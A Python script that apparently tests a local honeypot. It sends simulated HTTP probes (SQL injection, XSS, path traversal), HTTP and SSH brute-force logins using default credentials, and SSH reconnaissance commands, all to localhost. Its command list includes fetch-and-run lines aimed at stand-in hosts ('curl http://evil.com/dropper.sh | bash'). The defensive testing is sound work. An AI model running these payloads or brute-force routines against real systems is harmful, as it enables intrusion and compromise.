#!/usr/bin/env python3
"""
Comprehensive attack simulation script
Tests both HTTP and SSH decoys with realistic attack patterns
"""
import requests
import paramiko
import time
import sys
import random
from datetime import datetime

# Target configuration
HTTP_TARGET = 'http://localhost:8080'
SSH_TARGET = ('localhost', 2222)

# Test credentials (common botnet/attacker patterns)
CREDENTIALS = [
    ('admin', 'admin'),
    ('root', 'password'),
    ('admin', '123456'),
    ('root', 'toor'),
    ('user', 'user'),
    ('test', 'test'),
    ('ubuntu', 'ubuntu'),
    ('pi', 'raspberry'),
    ('admin', 'admin123'),
    ('root', ''),
]

# HTTP attack patterns
HTTP_PATHS = [
    '/',
    '/admin',
    '/admin.php',
    '/wp-admin',
    '/wp-login.php',
    '/phpmyadmin',
    '/phpMyAdmin',
    '/admin/login',
    "/../etc/passwd",
    "/index.php?id=1' OR '1'='1",
    "/<script>alert('xss')</script>",
    "/admin?id=1 UNION SELECT NULL",
]

# SSH commands to test
SSH_COMMANDS = [
    'whoami',
    'id',
    'uname -a',
    'cat /etc/passwd',
    'ps aux',
    'netstat -tulpn',
    'wget http://malicious.com/malware',
    'curl http://evil.com/dropper.sh | bash',
    'crontab -e',
    'history',
]


def print_banner():
    """Print script banner"""
    print("=" * 70)
    print("🧪 Network Honeypot - Comprehensive Attack Simulation")
    print("=" * 70)
    print(f"HTTP Target: {HTTP_TARGET}")
    print(f"SSH Target:  {SSH_TARGET[0]}:{SSH_TARGET[1]}")
    print(f"Time:        {datetime.now().isoformat()}")
    print()


def test_http_attacks(count: int = 20):
    """Simulate HTTP attacks"""
    print(f"[*] Simulating {count} HTTP attacks...")

    success_count = 0
    for i in range(count):
        try:
            # Random path
            path = random.choice(HTTP_PATHS)
            url = f"{HTTP_TARGET}{path}"

            # Random user agent
            user_agents = [
                'Mozilla/5.0 (compatible; Googlebot/2.1)',
                'sqlmap/1.5',
                'python-requests/2.28.0',
                'curl/7.68.0',
                'Nikto/2.1.6',
            ]
            headers = {'User-Agent': random.choice(user_agents)}

            # Send request
            response = requests.get(url, headers=headers, timeout=5)
            print(f"  [{i+1}/{count}] GET {path:40s} -> {response.status_code}")
            success_count += 1
            time.sleep(random.uniform(0.2, 0.5))

        except requests.exceptions.RequestException as e:
            print(f"  ✗ HTTP request failed: {e}")
            continue

    print(f"[✓] HTTP attacks completed: {success_count}/{count}\n")
    return success_count


def test_http_login_bruteforce(count: int = 10):
    """Simulate HTTP login brute force"""
    print(f"[*] Simulating {count} HTTP login attempts...")

    success_count = 0
    for i in range(count):
        try:
            username, password = random.choice(CREDENTIALS)
            url = f"{HTTP_TARGET}/login"
            data = {'username': username, 'password': password}
            headers = {'User-Agent': 'BruteForceBot/2.1'}

            response = requests.post(url, data=data, headers=headers, timeout=5)
            print(f"  [{i+1}/{count}] POST /login - {username:10s} / {password:15s} -> {response.status_code}")
            success_count += 1
            time.sleep(random.uniform(0.3, 0.7))

        except requests.exceptions.RequestException as e:
            print(f"  ✗ Login attempt failed: {e}")
            continue

    print(f"[✓] Login attempts completed: {success_count}/{count}\n")
    return success_count


def test_ssh_bruteforce(count: int = 5):
    """Simulate SSH brute force attacks"""
    print(f"[*] Simulating {count} SSH brute force attempts...")

    success_count = 0
    for i in range(count):
        try:
            username, password = random.choice(CREDENTIALS)

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                client.connect(
                    SSH_TARGET[0],
                    port=SSH_TARGET[1],
                    username=username,
                    password=password,
                    timeout=5,
                    banner_timeout=5
                )
                print(f"  [{i+1}/{count}] SSH {username:10s} / {password:15s} -> Connected (unexpected!)")
            except paramiko.AuthenticationException:
                print(f"  [{i+1}/{count}] SSH {username:10s} / {password:15s} -> Auth failed (expected)")
                success_count += 1
            finally:
                client.close()

            time.sleep(random.uniform(0.5, 1.0))

        except Exception as e:
            print(f"  ✗ SSH connection error: {e}")
            continue

    print(f"[✓] SSH brute force completed: {success_count}/{count}\n")
    return success_count


def test_ssh_interactive(command_count: int = 10):
    """Simulate SSH interactive session with commands"""
    print(f"[*] Simulating SSH interactive session with {command_count} commands...")

    try:
        username, password = random.choice(CREDENTIALS)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Note: This will fail auth, but some honeypots might still give a shell
        # This demonstrates what a real attacker would try
        try:
            client.connect(
                SSH_TARGET[0],
                port=SSH_TARGET[1],
                username=username,
                password=password,
                timeout=5
            )

            # If we got here, we're connected (shouldn't happen in honeypot)
            print(f"  [!] SSH connection established (unexpected)")

            # Execute commands
            for i, command in enumerate(random.sample(SSH_COMMANDS, min(command_count, len(SSH_COMMANDS)))):
                try:
                    stdin, stdout, stderr = client.exec_command(command, timeout=5)
                    output = stdout.read().decode('utf-8', errors='ignore')[:100]
                    print(f"  [{i+1}] {command} -> {len(output)} bytes")
                    time.sleep(0.5)
                except Exception as e:
                    print(f"  ✗ Command failed: {e}")

            client.close()

        except paramiko.AuthenticationException:
            print(f"  [✓] SSH auth failed (expected in honeypot)")
            print(f"      Credentials logged: {username} / [redacted]")

    except Exception as e:
        print(f"  [!] SSH session error: {e}")

    print()


def main():
    """Run comprehensive attack simulation"""
    print_banner()

    # Check if targets are available
    try:
        response = requests.get(HTTP_TARGET, timeout=3)
        print(f"[✓] HTTP target is responding\n")
    except requests.exceptions.RequestException:
        print(f"[✗] Cannot connect to HTTP target: {HTTP_TARGET}")
        print(f"    Start honeypot with: python -m app.main\n")
        sys.exit(1)

    # Run simulations
    total_tests = 0
    passed_tests = 0

    print("=" * 70)
    print("PHASE 1: HTTP ATTACK SIMULATION")
    print("=" * 70)
    print()

    result = test_http_attacks(20)
    total_tests += 20
    passed_tests += result

    result = test_http_login_bruteforce(10)
    total_tests += 10
    passed_tests += result

    print("=" * 70)
    print("PHASE 2: SSH ATTACK SIMULATION")
    print("=" * 70)
    print()

    result = test_ssh_bruteforce(5)
    total_tests += 5
    passed_tests += result

    test_ssh_interactive(10)

    # Summary
    print("=" * 70)
    print("SIMULATION COMPLETE")
    print("=" * 70)
    print(f"Total requests sent: {total_tests}")
    print(f"Successfully logged:  {passed_tests}")
    print()
    print("📊 View captured data:")
    print(f"   Dashboard:     http://localhost:5000")
    print(f"   Database:      sqlite3 data/honeypot.db")
    print()
    print("🔍 Quick database queries:")
    print('   sqlite3 data/honeypot.db "SELECT COUNT(*) FROM sessions;"')
    print('   sqlite3 data/honeypot.db "SELECT COUNT(*) FROM auth_attempts;"')
    print('   sqlite3 data/honeypot.db "SELECT COUNT(*) FROM interactions;"')
    print()

    return 0


if __name__ == '__main__':
    sys.exit(main())
